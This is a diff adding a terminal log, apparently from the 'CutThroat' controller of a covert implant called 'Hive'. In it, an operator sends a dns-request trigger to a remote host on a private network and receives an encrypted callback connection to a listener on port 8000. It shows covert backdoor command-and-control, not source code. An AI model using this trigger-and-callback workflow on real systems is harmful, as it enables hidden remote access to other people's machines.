@@ -1,0 +1,51 @@
+[0;37;40m[success] Successfully loaded ./hive [load]
+
+CutThroat
+JY008C634-6
+Version: 2.2
+CCS Version: 2.2
+
+Usage:
+
+	verbosity <level>	Sets the verbosity level
+	mode <new mode>		Sets the operating mode of CT
+	load <ILM Filename>	Loads the library
+	quit			Exits Command Post
+[?1034h
+> ilm connect 10.2.5.7
+ilm connect 10.2.5.7
+
+ WARNING:  The requested file [10.2.5.7] could not be opened so we will attempt to create a new one with the same name.
+
+ Callback IP address?   10.3.2.55
+  10.3.2.55
+ Callback Port number [1-65535]?   8000
+  8000
+ Remote IP address?     10.2.5.7
+  10.2.5.7
+ Trigger type [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]?   dns-request
+  dns-request
+ Listening for connection on port 8000 ...
+
+ Trigger details: 
+  . Remote IP address 10.2.5.7 with dns-request trigger 
+  . Callback IP address 10.3.2.55 on port 8000
+
+ Trigger sent.
+
+ ... connection established!
+
+ Connection details:
+  . Remote IP address 10.2.5.7 on port 57385
+  . Local  IP address 10.3.2.55 on port 8000
+
+ Enabling encrypted communications:
+  . TLS handshake complete.
+
+[Success] 
+************ Success ************
+[ilm connect 10.2.5.7]
+
+[10.2.5.7]>   quit 
+  quit 
+[0;39;49m
